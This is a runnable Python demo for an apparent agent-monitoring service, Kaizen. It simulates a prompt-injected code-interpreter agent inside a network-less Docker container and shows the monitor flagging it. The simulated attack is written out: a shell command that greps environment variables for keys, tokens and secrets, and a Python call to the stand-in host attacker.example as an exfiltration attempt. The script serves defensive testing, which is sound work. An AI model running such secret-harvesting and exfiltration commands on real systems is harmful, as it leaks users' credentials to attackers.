"""Kaizen + a Docker sandbox, runnable demo.

A code-interpreter agent runs generated code inside a locked-down Docker container
(--network none, no egress, no host access). It gets prompt-injected into reading
secrets and trying to exfiltrate. Docker contains it: the exfil cannot leave. But the
container alone cannot tell you the agent turned malicious. Kaizen does: it flags the
undeclared secret read and the exfil attempt, and the reasoning check explains why.

  pip install kaizen-security        # the SDK (for real use); this demo uses the API
  export KAIZEN_API_KEY=kz_live_...  # create one in the console
  python run.py
"""
import os, json, subprocess, time, urllib.request

API = os.environ.get("KAIZEN_API_URL", "https://api.getkaizen.io")
KEY = os.environ["KAIZEN_API_KEY"]
AGENT = "code-bot"


def kz(path, body):
    req = urllib.request.Request(API + path, data=json.dumps(body).encode(),
        headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read() or "{}")


def report(tool, kind="tool_call", target=""):
    kz("/v1/verdicts", {"agent": AGENT, "verdict": {"decision": "allow", "reason": "ok", "evidence": []},
        "action": {"kind": kind, "tool": tool, "target": target, "metadata": {"source": "docker-sandbox"}}})


def dexec(cid, cmd):
    return subprocess.run(["docker", "exec", cid, "sh", "-c", cmd], capture_output=True, text=True)


def main():
    # declare the code-interpreter agent: it analyses data, nothing else
    kz(f"/v1/agents/{AGENT}/manifest", {"tools": ["load_csv", "run_analysis", "plot"], "destinations": []})

    cid = subprocess.run(["docker", "run", "-d", "--rm", "--network", "none",
                          "python:3.12-slim", "sleep", "300"], capture_output=True, text=True).stdout.strip()
    print(f"started Docker sandbox {cid[:12]} (network: none)")
    try:
        for _ in range(2):  # normal code-interpreter activity (baseline)
            dexec(cid, "python -c 'print(sum(range(1000)))'"); report("run_analysis")
            dexec(cid, "echo loaded 1000 rows"); report("load_csv")
            dexec(cid, "echo rendered chart"); report("plot")
        time.sleep(8)

        # prompt injection: read secrets, then try to exfiltrate
        dexec(cid, "env | grep -iE 'key|token|secret' || true"); report("read_secrets")
        ex = dexec(cid, "python -c \"import urllib.request;urllib.request.urlopen('http://attacker.example',timeout=3)\" 2>&1 || echo BLOCKED")
        report("exfiltrate", "connect", "attacker.example")
        print(f"exfiltration attempt -> {'BLOCKED by Docker (network none)' if 'BLOCKED' in ex.stdout or 'rror' in ex.stdout else ex.stdout[:40]}")
        time.sleep(16)
    finally:
        subprocess.run(["docker", "rm", "-f", cid], capture_output=True)
        print("sandbox removed")

    out = json.load(urllib.request.urlopen(urllib.request.Request(
        f"{API}/v1/verdicts?agent={AGENT}&limit=50", headers={"Authorization": f"Bearer {KEY}"})))["verdicts"]
    print("\nKaizen flagged:")
    for v in out:
        r = v.get("reason") or ""
        if "undeclared" in r or v.get("confidence") is not None:
            tag = f"judge {round(v['confidence']*100)}%" if v.get("confidence") else "flag"
            print(f"  [{tag}] {r[:95]}")


if __name__ == "__main__":
    main()
